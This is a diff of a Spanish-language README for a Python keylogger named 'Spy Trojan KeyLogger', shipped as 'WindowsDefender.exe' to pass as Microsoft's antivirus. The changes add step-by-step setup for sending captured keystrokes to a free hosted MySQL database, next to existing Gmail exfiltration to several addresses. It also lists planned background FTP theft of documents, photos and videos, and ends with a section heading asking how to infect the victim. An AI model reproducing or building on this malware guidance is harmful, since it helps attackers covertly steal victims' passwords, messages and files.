@@ -1,12 +1,12 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█ ░░█ ▄▀█ █▄░█   █▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v3.3.4     
+▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0     
 ````
 ---
 ---
 * __Nombre:__ `Spy Trojan KeyLogger`
 * __Documentación:__ `22/05/2020`
-* __Versión:__ `3.3.4`
+* __Versión:__ `4.0`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__` Python 3.8`
@@ -28,7 +28,7 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
-- `WindowsDefender.exe` = Keylogger Compilado `3.3.4`
+- `WindowsDefender.exe` = Keylogger Compilado `4.0`
 - `WindowsDefender.py` = Código fuente del Keylogger
 ---
 ---
@@ -46,6 +46,9 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
         return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
         #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
     ````
+- __Conexión a una base de datos MySQL:__ Se enviarán los datos del registro mediante una base de datos, más información [Aquí]()
+
+
 - __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
 - __Intervalo de tiempo personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea recibir el registro de teclas. `No se recomienta que sea un intervalo muy pequeño, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, este tiempo transcurre desde el  inicio del script`
     ````py
@@ -74,8 +77,7 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 - __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
 
 
-## Caracteristicas que se agregarán en futuras actualizaciones: 
-- __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
+## Caracteristicas que se agregarán en futuras actualizaciones:  
 - __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
 - __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
 - __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
@@ -106,7 +108,7 @@ Requerimiento de paquetes de `Python3.8`:
 - `import threading`
 - `import pyinstaller`
 
-## Pasos para elegir su correo
+## Envió Mediante Gmail
 1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
 2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.
 
@@ -138,8 +140,43 @@ def ReceiveE():
 
 ````
 [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
----
----
+
+## Envío mediante Base de Datos |MySQL|
+
+1. Debes crearte una cuenta gratuita en [CleverCloud](https://www.clever-cloud.com/en/), cabe destacar que solo tenemos 10MB de almacenamiento, se recomienda, vaciar los datos cada vez que podamos, o utilizar otra base de datos.
+
+    ![Crear nueva base de datos ](https://i.imgur.com/EtkWgZe.png)
+2. Select a MySQL =>
+
+    ![Select Type DataBASE](https://i.imgur.com/qyaM5Rv.png)
+3. Creamos una Base de Datos gratuita o pagamos por el servicio, damos a `NEXT`.
+    
+    ![Create Free and Buy](https://i.imgur.com/nFUtGnY.png)
+4. Escribirmos el nombre para reconocer la base de datos.
+    ![Name DataBase](https://i.imgur.com/7KOUQip.png)
+5. Obtenemos los datos de conexión.
+    ![Clevercloud](https://i.imgur.com/JdGTqvB.png)
+6. Descargamos e instalamos [HeidiSQL](https://www.heidisql.com/download.php)y creamos una nueva sesión.
+    
+    ![](https://i.imgur.com/oOAiFL2.png)
+7. Creamos una nueva tabla con el Nombre= `keylog` y guardamos.
+
+    ![](https://i.imgur.com/8mcP594.png)
+8. Creamos los siguientes datos con los siguiente typos de datos: `l_id` la convertimos en llave primaria
+    ````c
+    l_id        // INT   // Llave Primaria  //Autoincremento
+    l_log       // MEDIUMTEXT [Acepta 16.777.215 Caracteres]
+                // LONGTEXT   [Acepta 4,292.967.295 Caracteres - Aprox 4GB de Texto]
+    ````
+    ![](https://i.imgur.com/TrGVRMB.png)
+9. 
+
+
+10. En el apartado Data, podrá ver el registro de teclas por día
+    ![Ver log](https://i.imgur.com/o2w2WMi.png)
+
+
+
 # Método de infección:
 ___¿Cómo infecto a la victima?___
 
